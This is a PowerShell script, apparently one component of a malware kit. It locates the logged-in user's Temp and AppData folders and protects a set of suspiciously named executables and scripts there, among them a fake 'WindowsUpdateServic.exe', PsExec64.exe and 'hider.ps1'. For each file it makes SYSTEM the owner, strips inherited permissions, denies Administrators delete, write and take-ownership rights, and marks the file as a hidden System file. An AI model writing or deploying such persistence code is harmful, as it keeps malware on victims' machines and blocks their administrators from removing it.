$LoggedInUser = (Get-CimInstance Win32_ComputerSystem).UserName
if ($LoggedInUser -and $LoggedInUser.Contains("\")) {
    $UserName = $LoggedInUser.Split("\")[1]
    $UserFolder = "C:\Users\$UserName"
} else {
    $UserName = (Get-Process explorer -ErrorAction SilentlyContinue | Select-Object -First 1).IncludeUserName
    if ($UserName -and $UserName.Contains("\")) { $UserName = $UserName.Split("\")[1] }
    else { $UserName = [Environment]::UserName } # Yedek plan
    $UserFolder = "C:\Users\$UserName"
}
$RealTemp = Join-Path $UserFolder "AppData\Local\Temp"
$RealAppData = Join-Path $UserFolder "AppData\Roaming"
$filePaths = @(
    (Join-Path $RealTemp "syshealth.pyw"),
    (Join-Path $RealTemp "PsExec64.exe"),
    (Join-Path $RealTemp "WindowsUpdateServic.exe"),
    (Join-Path $RealTemp "rights.ps1"),
    (Join-Path $RealTemp "hider.ps1"),
    (Join-Path $RealTemp "first.exe"),
    (Join-Path $RealAppData "WinHCheck.exe")
)
foreach ($filePath in $filePaths) {
    if (-not (Test-Path $filePath)) {
        continue
    }
    [System.IO.File]::SetAttributes($filePath, [System.IO.FileAttributes]::Normal)

    $aclSettings = Get-Acl -Path $filePath
    $systemAccount = New-Object System.Security.Principal.NTAccount("NT AUTHORITY\SYSTEM")
    $aclSettings.SetOwner($systemAccount)

    $aclSettings.SetAccessRuleProtection($true, $false)

    $systemAccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("NT AUTHORITY\SYSTEM", "FullControl", "Allow")
    $aclSettings.AddAccessRule($systemAccessRule)

    $adminGroup = New-Object System.Security.Principal.NTAccount("BUILTIN\Administrators")
    $readRights = [System.Security.AccessControl.FileSystemRights]::ReadAndExecute -bor 
                  [System.Security.AccessControl.FileSystemRights]::Read -bor
                  [System.Security.AccessControl.FileSystemRights]::Synchronize
    $adminReadRule = New-Object System.Security.AccessControl.FileSystemAccessRule($adminGroup, $readRights, "Allow")
    $aclSettings.AddAccessRule($adminReadRule)

    $denyRights = [System.Security.AccessControl.FileSystemRights]::Delete -bor 
                  [System.Security.AccessControl.FileSystemRights]::Write -bor 
                  [System.Security.AccessControl.FileSystemRights]::DeleteSubdirectoriesAndFiles -bor
                  [System.Security.AccessControl.FileSystemRights]::WriteAttributes -bor
                  [System.Security.AccessControl.FileSystemRights]::WriteExtendedAttributes -bor
                  [System.Security.AccessControl.FileSystemRights]::ChangePermissions -bor
                  [System.Security.AccessControl.FileSystemRights]::TakeOwnership

    $adminDenyRule = New-Object System.Security.AccessControl.FileSystemAccessRule($adminGroup, $denyRights, "Deny")
    $aclSettings.AddAccessRule($adminDenyRule)

    Set-Acl -Path $filePath -AclObject $aclSettings -ErrorAction SilentlyContinue

    [System.IO.File]::SetAttributes($filePath, [System.IO.FileAttributes]::ReadOnly -bor [System.IO.FileAttributes]::System)
}
